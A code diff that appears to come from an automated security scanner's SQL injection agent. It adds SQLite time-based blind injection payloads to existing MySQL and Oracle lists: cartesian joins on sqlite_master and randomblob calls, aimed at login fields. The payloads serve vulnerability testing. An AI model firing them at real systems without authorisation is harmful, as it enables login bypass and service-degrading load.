@@ -80,6 +80,10 @@ class SQLInjectionConfig:
         {"email": f"' AND (SELECT 1 FROM (SELECT(SLEEP({_delay})))a)--", "password": "anything"},
         {"username": f"' AND (SELECT 1 FROM (SELECT(SLEEP({_delay})))a)--", "password": "anything"},
         {"email": f"admin' AND SLEEP({_delay})--", "password": "anything"},
+        # SQLite heavy query login payloads
+        {"username": f"' OR (SELECT count(*) FROM sqlite_master AS A, sqlite_master AS B, sqlite_master AS C) > 0--", "password": "anything"},
+        {"email": f"' OR (SELECT count(*) FROM sqlite_master AS A, sqlite_master AS B, sqlite_master AS C) > 0--", "password": "anything"},
+        {"username": f"' OR randomblob(10000000) > 0--", "password": "anything"},
     ]
 
 
@@ -143,6 +147,13 @@ class SQLInjectionAgent(BaseSecurityAgent):
         ],
         "Oracle": [
             f"' AND DBMS_PIPE.RECEIVE_MESSAGE('a',{SQLInjectionConfig.TIME_DELAY_SECONDS})--",
+        ],
+        "SQLite": [
+            # Heavy query simulation (approximate delay)
+            f"' OR (SELECT count(*) FROM sqlite_master AS A, sqlite_master AS B, sqlite_master AS C) > 0--",
+            f"' AND (SELECT count(*) FROM sqlite_master AS A, sqlite_master AS B, sqlite_master AS C) > 0--",
+             # Randomblob heavy load
+            f"' OR randomblob(10000000) > 0--",
         ],
         "Generic": [
             f"' AND SLEEP({SQLInjectionConfig.TIME_DELAY_SECONDS})--",
